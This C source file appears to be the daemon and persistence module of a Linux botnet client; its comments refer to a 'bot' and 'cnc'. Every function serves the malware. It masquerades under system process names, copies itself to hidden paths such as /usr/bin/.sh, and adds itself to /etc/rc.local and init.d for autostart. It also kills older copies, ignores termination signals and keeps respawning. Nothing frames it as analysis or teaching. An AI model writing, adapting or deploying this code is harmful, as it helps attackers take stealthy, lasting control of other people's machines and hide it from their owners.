#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sched.h>
#include <sys/wait.h>
#include <dirent.h>
#include <time.h>
#include "headers/daemon.h"

#define MAX_INSTANCES 2
#define LOCK_FILE "/tmp/.instance_lock"

static void set_name(const char *name) {
    prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
}

static void gen_name(char *out, int len) {
    const char *sys_names[] = {"init","systemd", "udevd", "dbus", "sshd", "rsyslogd", "cron"};
    int idx = time(NULL) % (sizeof(sys_names)/sizeof(sys_names[0]));
    strncpy(out, sys_names[idx], len-1);
    out[len-1] = '\0';
}

static void exec_cmd(const char *cmd) {
    int ret = system(cmd);
    (void)ret;
}

static pid_t find_pid_slot(void) {
    DIR *dir;
    struct dirent *ent;
    pid_t lowest = 300;
    int taken[1000] = {0};

    if((dir = opendir("/proc")) != NULL) {
        while((ent = readdir(dir)) != NULL) {
            pid_t pid = atoi(ent->d_name);
            if(pid > 0 && pid < 1000) taken[pid] = 1;
        }
        closedir(dir);
    }

    for(pid_t i = 300; i < 1000; i++) {
        if(!taken[i]) {
            lowest = i;
            break;
        }
    }
    return lowest;
}

static int check_running_instances(void) {
    int count = 0;
    DIR *dir;
    struct dirent *ent;
    char cmdline[256], buf[256];
    
    if((dir = opendir("/proc")) != NULL) {
        while((ent = readdir(dir)) != NULL) {
            pid_t pid = atoi(ent->d_name);
            if(pid <= 0) continue;
            
            snprintf(cmdline, sizeof(cmdline), "/proc/%d/cmdline", pid);
            FILE *f = fopen(cmdline, "r");
            if(!f) continue;
            
            if(fgets(buf, sizeof(buf), f)) {
                if(strstr(buf, "init") || strstr(buf, "systemd") || 
                   strstr(buf, "udevd") || strstr(buf, "sshd")) {
                    count++;
                }
            }
            fclose(f);
        }
        closedir(dir);
    }
    return count;
}

static int acquire_instance_lock(void) {
    int fd = open(LOCK_FILE, O_RDWR|O_CREAT, 0600);
    if(fd < 0) return 0;
    
    struct flock fl = {
        .l_type = F_WRLCK,
        .l_whence = SEEK_SET,
        .l_start = 0,
        .l_len = 1
    };
    
    if(fcntl(fd, F_SETLK, &fl) < 0) {
        close(fd);
        return 0;
    }
    return 1;
}

static void respawn_proc(void) {
    if(check_running_instances() >= MAX_INSTANCES) return;
    if(!acquire_instance_lock()) return;
    char path[256];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path)-1);
    if(len < 0) return;
    path[len] = '\0';
    const char *dirs[] = {"/tmp/.sysd", "/var/run/.sysd"};
    for(int i = 0; i < 2; i++) {
        char tmp_path[256];
        snprintf(tmp_path, sizeof(tmp_path), "%s", dirs[i]);
        int fd = open(tmp_path, O_RDWR|O_CREAT, 0755);
        if(fd > -1) {
            close(fd);
            char cmd[512];
            if(snprintf(cmd, sizeof(cmd), "cp %s %s", path, tmp_path) >= sizeof(cmd)) {
                unlink(tmp_path);
                continue;
            }
            exec_cmd(cmd);
            pid_t child = fork();
            if(child == 0) {
                setsid();
                char *argv_fake[] = {"kworker", NULL};
                extern char **environ;
                for(char **env = environ; *env; ++env) memset(*env, 0, strlen(*env));
                execl(tmp_path, "kworker", NULL);
                exit(0);
            }
            unlink(tmp_path);
            if(child > 0) break;
        }
    }
}

static void hide_pid(void) {
    char buf[64], name[32];
    int fd;
    
    gen_name(name, sizeof(name));
    set_name(name);
    
    snprintf(buf, sizeof(buf), "/proc/%d/fd/0", getpid());
    if((fd = open(buf, O_RDWR)) > -1) {
        dup2(fd, 0);
        close(fd);
    }
}

int startup_persist(char *exec) {
    // Kill previous bot, incase of update/rerun
    DIR *dir = opendir("/proc");
    if (dir) {
        struct dirent *ent;
        while ((ent = readdir(dir)) != NULL) {
            pid_t pid = atoi(ent->d_name);
            if (pid <= 1 || pid == getpid()) continue;
            char exe_path[256];
            snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
            char realpath_buf[512];
            ssize_t len = readlink(exe_path, realpath_buf, sizeof(realpath_buf)-1);
            if (len > 0) {
                realpath_buf[len] = '\0';
                if (strcmp(realpath_buf, exec) == 0 || strcmp(realpath_buf, "/usr/bin/.sh") == 0) {
                    kill(pid, SIGKILL);
                }
            }
        }
        closedir(dir);
    }
    int wait_count = 0;
    int can_copy = 0;
    while (wait_count < 20) {
        if (access("/usr/bin/.sh", W_OK) == 0 || access("/usr/bin/.sh", F_OK) != 0) {
            can_copy = 1;
            break;
        }
        usleep(100000);
        wait_count++;
    }
    if (can_copy) {
        char buf[512];
        FILE *f;
        int found = 0;
        snprintf(buf, sizeof(buf), "cp %s /usr/bin/.sh", exec);
        exec_cmd(buf);
        f = fopen("/etc/rc.local", "r+");
        if(f) {
            char line[512];
            while(fgets(line, sizeof(line), f)) {
                if(strstr(line, "/usr/bin/.sh")) { found = 1; break; }
            }
            if(!found) { fseek(f, 0, SEEK_END); fprintf(f, "/usr/bin/.sh &\n"); }
            fclose(f); chmod("/etc/rc.local", 0755); return 0;
        }
        f = fopen("/etc/init.d/sysd", "w");
        if(f) {
            fprintf(f, "#!/bin/sh\n/usr/bin/.sh &\n");
            fclose(f);
            chmod("/etc/init.d/sysd", 0755);
            symlink("/etc/init.d/sysd", "/etc/rc2.d/S99sysd");
        }
        return 0;
    }
    // cant copy, continue & ignore
    return 0;
}

void daemonize(int argc, char **argv) {
    pid_t pid;

    if(fork()) exit(0);
    if(setsid() < 0) exit(1);
    if(fork()) exit(0);

    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGALRM, SIG_IGN);
    signal(SIGTRAP, SIG_IGN);
    signal(SIGURG, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);

    if(chdir("/") < 0) exit(1);
    umask(0);

    for(int i = 0; i < 1024; i++)
        close(i);
    open("/dev/null", O_RDWR);
    dup2(0, 1);
    dup2(0, 2);

    hide_pid();
    if(argc > 0) {
        startup_persist(argv[0]);
        respawn_proc();
    }

    sched_setscheduler(0, SCHED_RR, &(struct sched_param){.sched_priority = 0});

    while(1) {
        pid = fork();
        if(pid == 0) return;
        if(pid > 0) {
            int status;
            waitpid(pid, &status, 0);
            if(WIFEXITED(status)) {
//cnc is dead, dont respawn
                int exit_code = WEXITSTATUS(status);
                if(exit_code == 42) {
                    exit(0);
                }
                if(exit_code == 0) {
                    sleep(15);
                } else {
                    sleep(5);
                }
                respawn_proc();
            } else {
                respawn_proc();
                sleep(5);
            }
        }
    }
}
